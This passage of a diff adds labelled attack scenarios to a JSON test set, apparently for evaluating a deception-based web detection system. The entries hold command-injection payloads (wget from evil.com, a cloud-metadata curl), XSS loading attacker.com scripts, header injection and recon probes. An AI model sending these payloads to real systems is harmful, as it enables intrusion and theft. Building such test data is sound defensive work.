+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/api/v1/tools/traceroute",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "target=8.8.8.8%3B+whoami",
+        "client_ip": "10.0.50.125"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-026",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_026",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=$(wget+http://evil.com/shell+-O+/tmp/s)",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.126"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-027",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_027",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/api/v1/exec",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "cmd=%60uname+-a%60",
+        "client_ip": "10.0.50.127"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-028",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_028",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=%26%26+netstat+-an",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.128"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-029",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_029",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/registro.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "nombre=admin%26%26curl+http://169.254.169.254/latest/meta-data/&email=a@b.com",
+        "client_ip": "10.0.50.129"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-030",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_030",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/debug?eval=Runtime.getRuntime().exec(%27reboot%27)",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.130"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-031",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_031",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.131"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-032",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_032",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "id=1&nombre=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&precio=10&cantidad=1",
+        "client_ip": "10.0.50.132"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-033",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_033",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=%22%3E%3Csvg/onload=alert(%27XSS%27)%3E",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.133"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-034",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_034",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/miembros/editar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "nombre=%3Cbody+onload=alert(1)%3E&email=test@test.com",
+        "client_ip": "10.0.50.134"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-035",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_035",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/search?term=javascript:alert(1)",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.135"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-036",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_036",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=%3Ciframe+src%3D%22http://evil.com%22%3E",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.136"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-037",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_037",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/contact.html",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "nombre=test&mensaje=%3Ca+href%3D%22javascript:alert(document.domain)%22%3Eclick%3C/a%3E",
+        "client_ip": "10.0.50.137"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-038",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_038",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "XSS",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=%3Cscript%20src=http://attacker.com/hook.js%3E%3C/script%3E",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.138"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-039",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_039",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "id=1&nombre=Jamon&precio=-9999&cantidad=100&B1=Comprar",
+        "client_ip": "10.0.50.139"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-040",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_040",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "id=1&nombre=Lomo&precio=100&cantidad=1&B1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "client_ip": "10.0.50.140"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-041",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_041",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/miembros/editar.jsp?id=1%0D%0ASet-Cookie:%20admin=true",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.141"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-042",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_042",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/pagar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "titular=admin&tarjeta=0000000000000000&caducidad=99%2F99&cvv=000&importe=0.01",
+        "client_ip": "10.0.50.142"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-043",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_043",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/registro.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "nombre=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&email=overflow@test.com",
+        "client_ip": "10.0.50.143"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-044",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_044",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "PARAM_TAMPERING",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=99999999999999999999999999999999999999999999",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.144"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-045",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_045",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/manager/html",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Nikto/2.1.6"
+        },
+        "body": "",
+        "client_ip": "10.0.50.145"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-046",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_046",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/phpmyadmin/scripts/setup.php",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Nmap Scripting Engine (https://nmap.org/nsedoc/)"
+        },
+        "body": "",
+        "client_ip": "10.0.50.146"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-047",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_047",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "RECON",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/.env",
+        "headers": {
+          "host": "localhost:8080",
